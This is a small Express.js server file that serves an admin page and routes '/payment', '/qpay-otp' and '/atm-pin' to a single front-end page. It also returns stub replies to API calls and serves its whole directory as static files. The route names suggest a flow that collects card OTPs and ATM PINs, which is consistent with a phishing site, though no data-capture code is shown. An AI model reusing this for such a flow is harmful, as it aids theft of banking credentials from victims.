const express = require('express');
const path = require('path');
const app = express();
const port = process.env.PORT || 8080;

// Middleware for parsing JSON
app.use(express.json());

// Serve static files from the 'assets' directory explicitly
app.use('/assets', express.static(path.join(__dirname, 'assets')));

// Serve other static files from the root directory
app.use(express.static(__dirname));

// Admin route
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

// Explicit routes for common pages to avoid 404
const pages = ['/loading', '/payment', '/qpay-otp', '/atm-pin'];
pages.forEach(page => {
  app.get(page, (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
  });
});

// API routes placeholder (to avoid 404 on background calls)
app.all('/api/*', (req, res) => {
  res.status(200).json({ status: 'ok', message: 'API placeholder' });
});

// Home route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Fallback to index.html for all other routes (SPA support)
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.listen(port, '0.0.0.0', () => {
  console.log(`Server is running on port ${port}`);
});
